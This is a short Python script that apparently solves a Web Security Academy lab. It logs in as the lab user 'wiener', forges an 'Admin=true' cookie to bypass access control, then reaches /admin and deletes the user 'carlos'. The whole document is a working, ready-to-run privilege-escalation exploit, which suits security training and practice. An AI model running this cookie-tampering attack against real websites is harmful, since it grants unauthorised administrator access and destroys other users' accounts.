import requests
from bs4 import BeautifulSoup

site = "0afc00b004693b2881761be700710076.web-security-academy.net"
s = requests.Session()

# Step 1: Log in as wiener
login_url = f"https://{site}/login"
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

login_data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
s.post(login_url, data=login_data)

# Step 2: Tamper the Admin cookie manually
admin_cookie = requests.cookies.create_cookie(domain=site, name='Admin', value='true')
s.cookies.set_cookie(admin_cookie)

# Step 3: Access /admin and find the delete link
admin_url = f"https://{site}/admin"
resp = s.get(admin_url)
soup = BeautifulSoup(resp.text, 'html.parser')
delete_link = [link.get('href') for link in soup.find_all('a') if 'carlos' in str(link)]

if delete_link:
    delete_url = f"https://{site}{delete_link[0]}"
    confirm = s.get(delete_url)
    if "Congratulations" in confirm.text:
        print("[✓] Successfully deleted carlos.")
    else:
        print("[!] Delete request failed.")
else:
    print("[!] Could not find carlos delete link.")
